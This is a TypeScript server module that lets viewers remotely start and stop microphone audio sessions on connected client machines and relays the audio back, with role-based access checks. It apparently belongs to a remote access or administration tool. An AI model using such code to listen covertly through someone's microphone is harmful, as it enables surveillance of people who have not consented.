import type { ServerWebSocket } from "bun";
import { v4 as uuidv4 } from "uuid";
import * as clientManager from "../clientManager";
import { encodeMessage } from "../protocol";
import * as sessionManager from "../sessions/sessionManager";
import type { SocketData, VoiceViewer } from "../sessions/types";
import { canUserAccessClient } from "../users";
import { safeSendViewerBytes } from "./ws-viewer-utils";

function sendVoiceCommand(clientId: string, commandType: "voice_session_start" | "voice_session_stop" | "voice_downlink", payload: Record<string, unknown>) {
  const target = clientManager.getClient(clientId);
  if (!target) return false;
  try {
    target.ws.send(
      encodeMessage({
        type: "command",
        commandType: commandType as any,
        id: uuidv4(),
        payload,
      }),
    );
    return true;
  } catch {
    return false;
  }
}

function safeJson(ws: ServerWebSocket<SocketData>, payload: Record<string, unknown>) {
  try {
    ws.send(JSON.stringify(payload));
  } catch {
    // ignore broken sockets
  }
}

export function handleVoiceViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  ws.data.sessionId = sessionId;
  const target = clientManager.getClient(clientId);
  const session: VoiceViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addVoiceSession(session);

  safeJson(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeJson(ws, { type: "status", status: "offline", reason: "Client is offline" });
    return;
  }

  safeJson(ws, { type: "status", status: "ready" });
}

export function handleVoiceViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const { clientId } = ws.data;
  if (typeof raw === "string") {
    try {
      const message = JSON.parse(raw);
      if (message?.type === "start") {
        const source = typeof message?.source === "string" ? message.source : "microphone";
        const started = sendVoiceCommand(clientId, "voice_session_start", {
          source,
          sessionId: ws.data.sessionId,
        });
        safeJson(ws, { type: "status", status: started ? "connected" : "error" });
        return;
      }
      if (message?.type === "stop") {
        sendVoiceCommand(clientId, "voice_session_stop", {});
        safeJson(ws, { type: "status", status: "disconnected" });
      }
    } catch {
      // ignore malformed JSON control messages
    }
    return;
  }

  const chunk = raw instanceof Uint8Array ? raw : new Uint8Array(raw);
  if (chunk.byteLength === 0) return;
  sendVoiceCommand(clientId, "voice_downlink", { data: chunk });
}

export function handleVoiceUplink(clientId: string, payload: any) {
  if (typeof payload?.sessionId === "string" && payload.sessionId.length > 128) return;
  const sessionId = typeof payload?.sessionId === "string" ? payload.sessionId : "";
  const bytes = payload?.data instanceof Uint8Array
    ? payload.data
    : payload?.data instanceof ArrayBuffer
      ? new Uint8Array(payload.data)
      : ArrayBuffer.isView(payload?.data)
        ? new Uint8Array(payload.data.buffer, payload.data.byteOffset, payload.data.byteLength)
        : null;
  if (!bytes || bytes.byteLength === 0) return;

  for (const session of sessionManager.getVoiceSessionsByClient(clientId)) {
    if (sessionId && session.id !== sessionId) continue;
    safeSendViewerBytes(session.viewer, bytes, undefined, "voice");
  }
}

export function cleanupVoiceViewer(ws: ServerWebSocket<SocketData>) {
  let removedClientId = ws.data.clientId;
  for (const [sid, session] of sessionManager.getAllVoiceSessions().entries()) {
    if (session.viewer === ws) {
      removedClientId = session.clientId;
      sessionManager.deleteVoiceSession(sid);
      break;
    }
  }

  const hasViewers = sessionManager.getVoiceSessionsByClient(removedClientId).length > 0;
  if (!hasViewers) {
    sendVoiceCommand(removedClientId, "voice_session_stop", {});
  }
}
